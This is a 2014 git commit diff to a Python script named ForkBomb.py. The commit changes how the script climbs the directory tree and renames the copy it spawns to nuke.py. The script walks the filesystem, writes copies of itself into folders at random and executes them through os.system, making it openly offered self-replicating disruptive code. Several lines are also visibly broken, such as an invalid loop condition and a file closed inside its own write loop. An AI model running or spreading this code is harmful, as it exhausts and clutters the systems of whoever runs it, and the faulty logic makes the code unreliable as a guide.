10b2a918fb89c5bb6739c639f9fe357d827aa52d
Tyler Robbins <tyler@familyrobbins.com>
2014-01-28 23:44:01 -0800

    Forced program to fork from Desktop instead of root.

--- ForkBomb.py
+++ ForkBomb.py
@@ -10,7 +10,8 @@ if str(platform.system()) == 'Windows':
 else:
 	slash = "//"
 
-for item in os.getcwd().split(slash):
+for item in os.getcwd().split(slash)[:len(str(os.getcwd()).split(slash)) - (len(str(os.getcwd()).split(slash)) - 5)]: #changes to 4 directories above the root
+	print item
 	os.chdir(".." + slash)
 
 for root, dirs in os.walk(os.getcwd()):
@@ -18,19 +19,21 @@ for root, dirs in os.walk(os.getcwd()):
 		x = random.randint(1,2)
 
 		if x == 1:
-			fork = open("ForkBomb.py", 'wb')
-			for line in fork and i < 33:
+			fork = open("nuke.py", 'wb')
+			for line in main and i < 36:
 				i += 1
 				fork.write(main.readline())
 				fork.close()
 
 			if str(platform.system()) == 'Windows':
-				os.system("ForkBomb.py")
+				os.system("nuke.py")
 			else:
-				os.system("./ForkBomb.py")
+				os.system("python nuke.py")
+	except Exception as e:
+		print e
 
-print "Have a nice day!"
+	print u'\u2622 \u263A' + "Have a nice day!" + u'\u263A \u2622'
 
 for item in os.walk(os.getcwd()):
-	if item == 'ForkBomb.py':
-		os.remove('ForkBomb.py')
+	if item == 'nuke.py':
+		os.remove('nuke.py')
